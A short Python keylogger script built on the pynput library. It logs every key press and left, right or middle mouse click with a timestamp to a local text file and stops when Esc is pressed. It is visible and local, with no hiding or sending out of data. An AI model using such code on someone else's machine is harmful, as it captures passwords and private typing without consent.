from pynput import keyboard, mouse
from pynput.keyboard import Key, Listener
import logging

LOG_FILE = "keylogfile.txt"
ESCAPE_KEY = Key.esc

def setup_logging():
    """Configure logging settings."""
    with open(LOG_FILE, "w") as file:
        file.write("<-------------------------------------------------------Logfile------------------------------------------------------->\n")
        file.write("[Date Hour - 'Key' or 'Mouse Action'] :\n")

    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S")

def on_press(key):
    """Callback for key press event."""
    logging.info(f"[Key Pressed] - {key}")

    # Stop the script
    if key == ESCAPE_KEY:
        print("Stopping the script.")
        return False

def on_click(x, y, button, pressed):
    """Callback for mouse click event."""
    if pressed:
        if button == mouse.Button.left:
            logging.info('[Mouse Click] - Left Click')
        elif button == mouse.Button.right:
            logging.info('[Mouse Click] - Right Click')
        elif button == mouse.Button.middle:
            logging.info('[Mouse Click] - Middle Click')

def main():
    """Main function to set up listeners and start logging."""
    setup_logging()

    with keyboard.Listener(on_press=on_press) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
        print("Script started. Press 'Esc' to stop.")
        key_listener.join()
        mouse_listener.stop()

if __name__ == "__main__":
    main()
